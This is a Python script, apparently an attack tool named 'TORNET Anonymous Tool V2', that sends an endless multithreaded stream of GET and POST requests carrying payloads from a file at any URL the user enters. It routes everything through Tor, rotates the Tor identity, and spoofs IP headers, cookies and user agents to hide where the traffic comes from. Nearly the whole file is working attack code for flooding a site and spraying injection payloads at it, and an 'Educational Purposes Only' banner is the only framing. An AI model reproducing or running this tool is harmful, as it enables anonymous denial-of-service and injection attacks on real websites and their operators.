import requests
import random
import sys
import os
import time
import subprocess
import platform
from fake_useragent import UserAgent
from stem.control import Controller
from stem import Signal
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor

init()

ua = UserAgent()
user_agent = ua.random

num_threads = 900 

class log:
    wait = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTCYAN_EX} * {Fore.LIGHTWHITE_EX}]"
    success = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTGREEN_EX} ✓ {Fore.LIGHTWHITE_EX}]"
    error = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX} X {Fore.LIGHTWHITE_EX}]"

def change_tor_identity(tor_password):
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=tor_password)
        controller.signal(Signal.NEWNYM)
        print(log.success + f" TOR IP change completed.")

def loading_animation(duration):
    chars = ['/','|','\\','-']
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f'\r{Fore.LIGHTWHITE_EX}[{Fore.LIGHTMAGENTA_EX}{char}{Fore.LIGHTWHITE_EX}]{Fore.LIGHTCYAN_EX} Attack in progress. . . ')
            sys.stdout.flush()
            time.sleep(00.1)

with open('payload.txt', 'r') as file:
    payloads = [line.strip() for line in file if line.strip()]

def title():
    os.system('clear || cls')
    sys.stdout.write(f'''{Fore.LIGHTGREEN_EX}
                      ,╜.'
                    ,@"'
                    ╢'
                 {Fore.LIGHTWHITE_EX}  █▓{Fore.LIGHTMAGENTA_EX}╕
{Fore.LIGHTMAGENTA_EX} ╗╗╗HHH@@@@@L    {Fore.LIGHTWHITE_EX}  █▓{Fore.LIGHTMAGENTA_EX}╙          ╓╓╗╗╗@@H╗,   ╔H@N╖   %HH─ ╔╗╗╗╗HH%@@@ ╗╗╗HHH@@@@
{Fore.LIGHTMAGENTA_EX} ▒▒╢╢▒▒▒▒▒▒▒L   {Fore.LIGHTWHITE_EX}▄███▒█{Fore.LIGHTMAGENTA_EX}▒║╖       ▒▒▒▒▒▒║║▒▒H  ╢▒▒▒▒K ]▒▒▒  ▒▒▒▒╢╢▒▒▒▒╢ ▒║╢╢▒▒▒▒▒▒
 "  ]▒▒▒[   {Fore.LIGHTWHITE_EX} ▄██████▓▓█{Fore.LIGHTMAGENTA_EX}░▒▒║╖    ▒▒▒h   ▒▒▒╢  ▒▒▒▒▒▒╖]▒▒▒  ▒▒▒╢        "` j▒▒▒╢
    ]▒▒▒[  {Fore.LIGHTWHITE_EX} ██▀█████▒█▌▌{Fore.LIGHTMAGENTA_EX}▒▒▒▒▒   ▒╢▒╖╓╥║╢▒▒`  ▒▒╢▒▒▒▒╣▒▒▒ j▒▒▒╢@╣╣╣▒      j▒▒▒║
    ]▒▒▒[  {Fore.LIGHTWHITE_EX} █▌██▀███▓▌█{Fore.LIGHTMAGENTA_EX}[]░░░░  ]▒▒▒▒▒▒▒▒╜   ]▒▒▒[║▒╢▒▒▒▒ ]▒▒▒║╢Ñ╝╝╜      ]▒▒▒[
    ⌠╢▒▒" {Fore.LIGHTWHITE_EX}  █▌█▌████▓█▐{Fore.LIGHTMAGENTA_EX}[;░░░░  ]▒▒▒╙╙▒▒▒╢   ]▒▒╢L ║╣▒▒▒▒ ]▒▒▒C           ⌠║▒▒C
    [▒▒▒   {Fore.LIGHTWHITE_EX} ╙██▌██▌█▓▐{Fore.LIGHTMAGENTA_EX}⌠`░░░░`  ║▒▒▒   ╣▒▒╢⌐ ║▒▒▒U  ╢▒▒▒▒ ]▒▒▒▒▒▒▒▒▒▒     │╢▒▒
    ╚ÑÑÑ     {Fore.LIGHTWHITE_EX} ▀ÑN▀█▀▓{Fore.LIGHTMAGENTA_EX}',░░'     ╨╝╝╝    ╝╜   ╚ÑÑÑ`   ╝╝╝╝ ╙Ñ╨╝╝╝╝╨╜╜╙     ╚ÑÑÑ
                     
{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} Educational Purposes Only {Fore.LIGHTMAGENTA_EX}]
{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} TORNET Anonymous Tool V2  {Fore.LIGHTMAGENTA_EX}]
{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTGREEN_EX} -- --=>{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTWHITE_EX} By D3M3T0R_               {Fore.LIGHTMAGENTA_EX}]
\n''')
title()
cookies = {
    "sessionid": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
    "csrftoken": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=40)),
    "userid": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10)),
    "tracking_id": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16)),
    "custom_cookie": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=24)),
    "extra_cookie_1": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=20)),
    "extra_cookie_2": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15)),
    "hook_cookie": f"hook-{random.randint(10000, 99999)}",
}
headers = {
    "Content-Type": "application/json",
    "User-Agent": user_agent,
    "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9"]),
    "Referer": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
    "Connection": "close",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": random.choice(["https://google.com", "https://yahoo.com", "https://bing.com"]),
    "DNT": "1",
    "Expires": "0",
    "X-Download-Options": "noopen",
    "X-Robots-Tag": "noindex, nofollow",
    "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/html"]),
    'x-ims-clientid': 'homepage_milo',
    "Pragma": "no-cache",
    "TE": "Trailers",
    "Upgrade-Insecure-Requests": "1",
    "Forwarded": f"for={random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)};proto=https",
    "If-None-Match": f"{random.randint(10000, 99999)}",
    "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    "X-Forwarded-Proto": "https",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
    "Content-Security-Policy": "default-src 'self'",
    "X-Content-Type-Options": "nosniff",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Feature-Policy": "geolocation 'none'",
    "Permissions-Policy": "camera=(), microphone=()",
    "Accept-CH": "DPR, Viewport-Width, Width",
    "X-Permitted-Cross-Domain-Policies": "none",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "X-XSS-Protection": "1; mode=block",
    "Custom-Header": random.choice(["value1", "value2", "value3"]),
    "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch"]),
    "Content-Disposition": random.choice(["inline", "attachment"]),
    "Cache-Control": random.choice(["no-store", "no-cache", "must-revalidate"]),
    "X-Hook-Token": f"hook-token-{random.randint(10000, 99999)}",
    "X-Hook-ID": f"hook-id-{random.randint(10000, 99999)}",
    "X-Remote-Address": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
    "X-User-Type": random.choice(["guest", "member", "admin"]),
}
tor_proxy = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

char = [
    f'....',

    f'{Fore.YELLOW}E{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}E{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}E{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}E',

    f'{Fore.YELLOW}J{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}J{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}J{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}J',

    f'{Fore.YELLOW}M{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}M{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}M{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}M',

    f'{Fore.YELLOW}P{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}P{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}P{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}P',

    f'{Fore.YELLOW}I{Fore.WHITE}...',
    f'{Fore.WHITE}.{Fore.YELLOW}I{Fore.WHITE}..',
    f'{Fore.WHITE}..{Fore.YELLOW}I{Fore.WHITE}.',
    f'{Fore.WHITE}...{Fore.YELLOW}I',
]

def send_get_request(payload):
    try:
        random_char = random.choice(char)
        response = requests.get(url, proxies=tor_proxy, params={'data': payload}, headers=headers, cookies=cookies)
        print(log.success + f" {random_char} {Fore.LIGHTWHITE_EX}-{Fore.LIGHTGREEN_EX} GET {Fore.LIGHTWHITE_EX}- STATUS :{Fore.LIGHTCYAN_EX} {response.status_code} {Fore.LIGHTWHITE_EX}- {payload}")
    except Exception as e:
        pass

def send_post_request(payload):
    try:
        random_char = random.choice(char)
        response = requests.post(url, proxies=tor_proxy, data={'data': payload}, headers=headers, cookies=cookies)
        print(log.success + f" {random_char} {Fore.LIGHTWHITE_EX}-{Fore.LIGHTGREEN_EX} POST {Fore.LIGHTWHITE_EX}- STATUS :{Fore.LIGHTCYAN_EX} {response.status_code} {Fore.LIGHTWHITE_EX}- {payload}")
    except Exception as e:
        pass

url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTMAGENTA_EX} +-=>{Fore.LIGHTWHITE_EX} ')
tor_password = input(f'{Fore.LIGHTWHITE_EX}TOR PASSWORD{Fore.LIGHTMAGENTA_EX} +-=>{Fore.LIGHTWHITE_EX} ')
loading_animation(2)
print()
try:
    os_name = platform.system().lower()
    if os_name == 'windows':
        subprocess.check_output(["where", "tor"], stderr=subprocess.STDOUT)
    else:
        subprocess.check_output(["which", "tor"], stderr=subprocess.STDOUT)
    print(log.success + " Tor is installed.")
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        change_tor_identity(tor_password)
        while True:
            payload = random.choice(payloads)
            if random.choice([True, False]):
                executor.submit(send_get_request, payload)
            else:
                executor.submit(send_post_request, payload)
            time.sleep(00.1)
except subprocess.CalledProcessError:
    print(log.error + " Tor is not installed.")
except Exception as e:
    print(log.error + f" An error occurred: {str(e)}")